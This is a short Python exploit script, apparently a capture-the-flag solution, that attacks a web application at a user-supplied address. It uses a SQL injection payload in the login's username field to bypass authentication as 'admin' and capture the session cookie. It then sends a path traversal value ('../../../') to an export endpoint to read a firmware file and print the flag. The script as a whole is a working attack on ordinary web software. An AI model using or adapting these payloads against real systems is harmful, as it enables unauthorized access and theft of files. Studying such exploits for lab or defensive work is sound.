import requests, hashlib, json

def bypass_login_get_cookies():
    password = "bruh"
    password_hash = hashlib.md5(password.encode()).hexdigest()
    data = json.dumps({"username" : f"\" union select \"admin\",\"{password_hash}", "password" : password})
    res = requests.post(url + "/api/login", headers=headers, data=data)
    return {"session" : res.cookies['session']}

def LFI_Path_traversal():
    flag = "../../../signal_sleuth_firmware"
    data = json.dumps({"name": f"{flag}"})
    res = requests.post(url + "/api/export", headers=headers, data=data, cookies=cookies)
    return res.text

if __name__ == "__main__":
    host = input("Target IP:PORT : ")
    url = f"http://{host}"
    headers = {"Content-Type": "application/json"}

    cookies = bypass_login_get_cookies()

    res = LFI_Path_traversal()

    print(f"Flag : {res}")